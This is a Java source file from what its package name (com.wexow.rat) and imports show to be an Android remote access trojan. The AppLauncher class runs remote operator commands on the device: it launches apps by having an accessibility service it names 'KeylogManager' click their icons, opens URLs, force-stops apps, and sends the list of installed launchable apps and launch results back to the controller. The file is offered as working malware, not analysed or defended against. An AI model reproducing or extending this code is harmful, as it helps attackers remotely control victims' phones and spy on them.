package com.wexow.rat.managers;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;
import com.wexow.rat.KeylogManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class AppLauncher {
    private static final String TAG = "AppLauncher";

    public static void launch(Context ctx, String packageName, String appName) {
        final String finalAppName;
        if (appName == null || appName.isEmpty()) {
            String detected = null;
            try {
                PackageManager pm = ctx.getPackageManager();
                ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
                detected = pm.getApplicationLabel(ai).toString();
            } catch (Exception e) {
                Log.e(TAG, "Failed to get app name: " + e.getMessage());
            }
            finalAppName = (detected != null) ? detected : packageName;
        } else {
            finalAppName = appName;
        }

        new Thread(() -> {
            try {
                Log.d(TAG, "🚀 Launching: " + packageName + " (name: " + finalAppName + ")");

                KeylogManager a11y = KeylogManager.getInstance();
                if (a11y != null) {
                    Log.d(TAG, "🎯 Using Accessibility to click icon: " + finalAppName);
                    a11y.launchAppByIcon(finalAppName);
                    sendResult(packageName, true, "via accessibility");
                    return;
                }

                PackageManager pm = ctx.getPackageManager();
                Intent intent = pm.getLaunchIntentForPackage(packageName);
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(intent);
                    sendResult(packageName, true, "via startActivity");
                } else {
                    sendResult(packageName, false, "No launch intent");
                }

            } catch (Exception e) {
                sendResult(packageName, false, e.getMessage());
            }
        }).start();
    }

    public static void openUrl(Context ctx, String url) {
    new Thread(() -> {
        try {
            Log.d(TAG, "🚀 Opening URL: " + url);
            
            KeylogManager a11y = KeylogManager.getInstance();
            if (a11y != null) {
                a11y.openUrl(url);
                return;
            }
            
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            
        } catch (Exception e) {
            Log.e(TAG, "openUrl: " + e.getMessage());
        }
    }).start();
}

    public static void openPlayStore(Context ctx, String packageName) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                Uri.parse("market://details?id=" + packageName));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=" + packageName));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    public static void listLaunchable(Context ctx) {
        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                Intent main = new Intent(Intent.ACTION_MAIN, null);
                main.addCategory(Intent.CATEGORY_LAUNCHER);
                List<ResolveInfo> activities = pm.queryIntentActivities(main, 0);

                JSONArray arr = new JSONArray();
                for (ResolveInfo ri : activities) {
                    JSONObject jo = new JSONObject();
                    jo.put("package", ri.activityInfo.packageName);
                    jo.put("name", ri.loadLabel(pm).toString());
                    jo.put("activity", ri.activityInfo.name);
                    arr.put(jo);
                }

                JSONObject res = new JSONObject();
                res.put("type", "launchable_apps");
                res.put("count", arr.length());
                res.put("data", arr);
                ConnectionManager.send(res.toString());
                Log.d(TAG, "Sent " + arr.length() + " launchable apps");
            } catch (Exception e) {
                Log.e(TAG, "listLaunchable: " + e.getMessage());
            }
        }).start();
    }

    public static void forceStop(Context ctx, String packageName) {
        try {
            android.app.ActivityManager am =
                (android.app.ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                am.killBackgroundProcesses(packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "forceStop: " + e.getMessage());
        }
    }

    private static void sendResult(String pkg, boolean success, String error) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "launch_result");
            jo.put("package", pkg);
            jo.put("success", success);
            if (error != null) jo.put("error", error);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }
}
